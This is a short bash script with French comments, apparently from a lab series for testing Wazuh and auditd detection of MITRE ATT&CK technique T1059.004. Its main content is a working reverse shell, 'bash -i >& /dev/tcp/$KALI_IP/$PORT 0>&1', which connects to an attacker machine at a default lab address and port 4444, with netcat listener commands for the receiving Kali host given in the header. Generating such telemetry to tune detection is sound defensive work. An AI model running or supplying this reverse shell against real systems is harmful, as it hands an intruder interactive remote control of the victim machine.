#!/bin/bash
# ──────────────────────────────────────────────────────────────────
# MITRE ATT&CK : T1059.004 — Command and Scripting Interpreter: Unix Shell
# Technique    : Reverse shell bash via /dev/tcp (sans binaire externe)
# Génère       : Wazuh (connexion sortante /dev/tcp) + auditd si configuré
# Run depuis   : Cible (Wazuh VM)
# Usage        : bash 10_reverse_shell.sh [KALI_IP] [PORT]
#
# Prérequis côté Kali (récepteur) :
#   nc -lvnp 4444
#   ou : rlwrap nc -lvnp 4444   (pour historique de commandes)
# ──────────────────────────────────────────────────────────────────

KALI_IP=${1:-192.168.56.103}
PORT=${2:-4444}

echo "[!] Lancer d'abord sur Kali : nc -lvnp $PORT"
echo "[!] Connexion dans 5 secondes → $KALI_IP:$PORT"
echo ""
sleep 5

echo "[*] Tentative reverse shell bash → $KALI_IP:$PORT"
bash -i >& /dev/tcp/"$KALI_IP"/"$PORT" 0>&1
